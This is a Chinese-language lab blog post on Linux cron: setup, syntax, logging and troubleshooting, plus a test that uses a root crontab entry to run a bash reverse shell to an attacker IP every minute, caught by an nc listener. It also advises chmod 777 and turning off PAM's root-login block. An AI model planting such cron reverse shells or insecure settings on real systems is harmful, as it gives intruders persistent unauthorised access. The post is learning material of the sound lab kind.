---
title: 定时任务
published: 2022-08-05 19:44
tags: [安全]
category: 工具
draft: false
---



# 定时任务

## 一、实验问题：

### 1、Ubuntu 20 以上版本无法直接使用root登录：（初始化环境，root无密码）

（1）设置root密码（如果设置过，此步可免）

```
sudo passwd root
新密码
再输入新密码
```

（2）修改配置文件1

```
sudo vim /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf

文件末尾添加：
greeter-show-manual-login=true
all-guest=false
```

![](/images/posts/scheduled-tasks/image-20220805174705748.png)

（3）修改配置文件2

```
sudo vim /etc/pam.d/gdm-autologin

将第三行注释掉
#auth   required        pam_succeed_if.so user != root quiet_success

```

![](/images/posts/scheduled-tasks/image-20220805174954677.png)

（4）修改配置文件3

```
sudo vim /etc/pam.d/gdm-password

将第三行注释掉
#auth   required        pam_succeed_if.so user != root quiet_success

```

![](/images/posts/scheduled-tasks/image-20220805175137233.png)

（5）修改配置文件4

```
sudo vim /root/.profile

将文件末尾的 mesg n 2> /dev/null || true 这一行修改成
tty -s&&mesg n || true

```

![](/images/posts/scheduled-tasks/image-20220805175412816.png)

### 2、/etc/crontab的作用？

这个crontab其实就相当于一个公共计划任务列表，因此比普通的计划任务要多个 name 字段。

![](/images/posts/scheduled-tasks/image-20220805173952705.png)

### 3、crontab -u root -e 实际的计划任务位置在哪里？  

```
vim /var/spool/cron/crontabs/root	#root用户
vim /var/spool/cron/crontabs/a		#a用户

crontab -u root -r					#清除root所有计划任务
crontab -u root -e					#编辑root计划任务
```

![](/images/posts/scheduled-tasks/image-20220805174133069.png)

这个位置的计划任务才是最重要的！！！

### 4、计划任务无法执行

（1）查看cron日志（排查错误）

```
vim /var/log/cron.log
```

![](/images/posts/scheduled-tasks/image-20220805175813333.png)

发现报错信息：

```
No MTA installed, discarding output
```

原因：cron把屏幕输出都发送到email了，而当前环境并未安装email server，于是系统报错。

（2）安装email服务器

```
sudo apt-get install postfix
```

安装这个的时候，出现了当时安装mysql的那种页面，需要下翻页面，然后使用上下左右键选中OK，回车即可。

（3）`/var/mail/` 目录错误排查

安装完邮件服务器后，我继续在/var/log/cron.log查看日志信息，这时已经不报错了，但是还是无法反弹shell。

```
vim /var/mail/root
```

![](/images/posts/scheduled-tasks/image-20220805180458132.png)

查看报错信息：（文件权问题，本次使用定时任务执行 shell 脚本）

```
/bin/sh: 1: /etc/crontabshell: Permission denied
```

将目标文件权限修改为777即可。

```
chmod 777 /etc/crontabshell
```

更多细节请看：https://blog.csdn.net/weixin_47608789/article/details/122762609

## 二、定时任务基础

### 1、基础命令：

```
##如果是CentOS则是crond
systemctl status cron （查看状态）	#查看计划任务是否正常运行

###如果没有，如下安装设置
apt install cron（安装 cron）
systemctl start cron（启动crond服务）
systemctl enable cron （设为开机启动）

##基础命令
##查看cron是否开启（CentOS是crond）
service cron status 
systemctl status cron.service

##开启cron
service cron start
systemctl start cron.service

##关闭
service cron stop 
systemctl stop cron.service

##重启cron
service cron restart
service cron reload
systemctl restart cron.service
```

### 2、常用参数

位置：/usr/bin/crontab

```
常用参数：
-e : 执行文字编辑器来设定时程表，vim /etc/crontab # vi打开并编辑也可以
-u user 设定指定 user 的时程表，如果不使用 -u user ，默认设定自己的时程表
-r : 删除目前的时程表
-l : 列出目前的时程表

crontab /etc/crontab   # 生效  (vi 命令新增定时任务时，需要执行)
```

### 3、开启日志

（1）修改配置文件（取消cron的注释）

```
vim  /etc/rsyslog.d/50-default.conf
```

![](/images/posts/scheduled-tasks/image-20220805194408458.png)

（2）重启rsyslog服务：日志服务

```
service rsyslog restart
```

（3）重启cron服务：定时任务服务

```
service cron restart
```

### 4、设置定时任务格式

```
f1 	 f2	  f3   f4	f5   comment（命令）
```

```
*    *    *    *    *
-    -    -    -    -
|    |    |    |    |
|    |    |    |    +----- 星期中星期几 (0 - 7) (星期天为0或7)
|    |    |    +---------- 月份 (1 - 12) 
|    |    +--------------- 一个月中的第几天 (1 - 31)
|    +-------------------- 小时 (0 - 23)
+------------------------- 分钟 (0 - 59)
```

```
星号(*)：代表所有可能的值，例如day字段如果是星号，则表示在满足其它字段的制约条件后每天都执行该命令操作。
逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”。
中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”。
正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。
```

实例：

```
#打开定时任务列表文件，进行编辑 保存 (注意:这里一定要写成全路径)
*/1 * * * * date >> /home/date_log.txt 	#（每分钟执行一次）

tail-f /home/date_log.txt   #查看任务运行结果
```

在 12 月内, 每天的早上 6 点到 12 点，每隔 3 个小时 0 分钟执行一次 

```
0 6-12/3 * 12 * /home/脚本.sh
```

## 三、实验步骤

### 测试一

1、判断环境

```
##查看cron是否开启（CentOS是crond）
service cron status 
systemctl status cron.service

##开启cron
service cron start
systemctl start cron.service

```

![](/images/posts/scheduled-tasks/image-20220805181231704.png)

2、编写定时任务（shell脚本）

```
vim /etc/crontabshell 

内容如下：
#!/bin/bash
bash -i >& /dev/tcp/192.168.50.128/5566 0>&1

```

3、设置定时任务（建议指定用户，写完之后直接保存退出，一会就会执行了）

也可以直接编辑目标用户的定时任务文件

```
crontab -u root -e

内容如下：
* * * * *	/etc/crontabshell		#每分钟执行一次shell脚本
```

![](/images/posts/scheduled-tasks/image-20220805181954481.png)

4、攻击主机开启端口监听（建议提前开启）

```
nc -lvp 5566
```

实验结果：实验成功

![](/images/posts/scheduled-tasks/image-20220805182014294.png)

### 测试二

1、直接在/etc/crontab中写计划任务

![](/images/posts/scheduled-tasks/image-20220805182543776.png)

2、指定计划任务执行目录（不指定也行，等一会就OK了）

```
crontab /etc/crontab
```

![](/images/posts/scheduled-tasks/image-20220805183400813.png)